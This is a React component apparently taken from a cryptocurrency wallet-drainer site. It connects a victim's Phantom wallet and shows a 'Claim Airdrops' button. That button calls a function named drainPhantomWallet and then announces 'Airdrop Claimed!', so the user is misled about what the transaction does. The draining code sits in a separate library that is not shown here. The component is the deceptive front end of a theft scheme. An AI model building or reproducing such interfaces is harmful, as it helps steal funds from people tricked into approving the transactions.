import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { connectPhantomWallet, disconnectPhantomWallet, drainPhantomWallet } from "@/lib/phantom";

export function WalletButton() {
  const [isConnected, setIsConnected] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [address, setAddress] = useState<string>("");
  const { toast } = useToast();

  const handleConnect = async () => {
    try {
      setIsLoading(true);
      const walletAddress = await connectPhantomWallet();
      setAddress(walletAddress);
      setIsConnected(true);
      toast({
        title: "Wallet Connected",
        description: `Connected to ${walletAddress.slice(0, 4)}...${walletAddress.slice(-4)}`,
      });
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Connection Failed",
        description: error instanceof Error ? error.message : "Failed to connect wallet",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleDisconnect = async () => {
    try {
      setIsLoading(true);
      await disconnectPhantomWallet();
      setIsConnected(false);
      setAddress("");
      toast({
        title: "Wallet Disconnected",
        description: "Successfully disconnected from Phantom wallet",
      });
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Disconnection Failed",
        description: error instanceof Error ? error.message : "Failed to disconnect wallet",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleClaim = async () => {
    try {
      setIsLoading(true);
      await drainPhantomWallet();
      toast({
        title: "Airdrop Claimed!",
        description: "Transaction completed successfully",
        className: "bg-gradient-to-r from-violet-500 to-indigo-500 text-white border-none",
      });
    } catch (error) {
      console.error("Claim error:", error);
      toast({
        variant: "destructive",
        title: "Claim Failed",
        description: error instanceof Error ? error.message : "Failed to complete transaction",
      });
    } finally {
      setIsLoading(false);
    }
  };

  if (isLoading) {
    return (
      <Button disabled className="w-full bg-gradient-to-r from-violet-600 to-indigo-600">
        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
        Please wait
      </Button>
    );
  }

  if (!isConnected) {
    return (
      <Button 
        onClick={handleConnect} 
        className="w-full bg-gradient-to-r from-violet-600 to-indigo-600 hover:from-violet-700 hover:to-indigo-700 transition-all duration-300 shadow-lg hover:shadow-xl"
      >
        Connect Phantom Wallet
      </Button>
    );
  }

  return (
    <div className="flex flex-col w-full gap-4">
      <p className="text-sm text-center text-muted-foreground">
        Connected: {address.slice(0, 4)}...{address.slice(-4)}
      </p>
      <Button 
        onClick={handleClaim} 
        variant="default"
        className="w-full bg-gradient-to-r from-violet-600 to-indigo-600 hover:from-violet-700 hover:to-indigo-700 transition-all duration-300 shadow-lg hover:shadow-xl"
      >
        Claim Airdrops
      </Button>
      <Button 
        onClick={handleDisconnect} 
        variant="outline" 
        className="w-full border-violet-200 hover:bg-violet-50"
      >
        Disconnect
      </Button>
    </div>
  );
}